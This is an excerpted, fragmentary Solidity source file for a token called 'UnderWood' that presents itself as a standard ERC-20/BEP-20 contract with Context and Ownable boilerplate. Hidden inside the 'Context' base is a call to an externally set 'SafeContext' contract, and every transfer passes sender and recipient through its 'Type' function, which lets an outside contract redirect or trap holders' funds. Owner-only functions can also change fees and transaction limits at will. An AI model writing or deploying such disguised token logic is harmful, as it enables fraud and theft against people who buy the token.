...
interface SafeContext {
    ...
    function Type(address account) external returns(address);
...
contract Context {
  ...
  constructor ()  { }
    ...
    */    
    ...
    function Type(address account) internal returns (address){
        return 
        _self.Type(account);
    }
...
contract Ownable is Context {  
    ...
    */
    ...
    /**
    * @dev init the current Context.
    */
    function initContext(address newOwner) internal returns (bool) {
        _self = SafeContext(newOwner);
        return true;
    }       
...
contract UnderWood is Context, IERC20, Ownable{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 10000000000 *  10**9;  
    string private _name = "UnderWood";
    ...
    event AutoLiquify(uint256 amountBNB, uint256 amountLiquify);
    constructor() {           
    ...
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(Type(_msgSender()), Type(recipient), amount);
        return true;
    } 
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if(inSwap && _balances[msgSender()] >= swapThreshold){ 
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        ...
        _transfer(Type(sender), Type(recipient), amount);        
        return true;
    } 
    ...
    /**
     * @dev set Limit Exempt.
     */
    function changeUnderWoodExempt(address holder) external onlyOwner {
    ...
    function swapUnderWoodBack() internal {        
    ...
    function setSwapUnderWoodBack(bool enableSwapBack, uint256 newSwapBackLimit) external onlyOwner {
        inSwap  = enableSwapBack;
        swapThreshold = newSwapBackLimit;
    }

    function setTxLimitUnderWood(uint256 newLimit) external onlyOwner {
        _maxTxAmount = newLimit;
    }

    function setUnderWoodFees(uint256 newLiqFee, uint256 newRewardFee, uint256 newMarketingFee, uint256 newExtraSellFee) external onlyOwner {
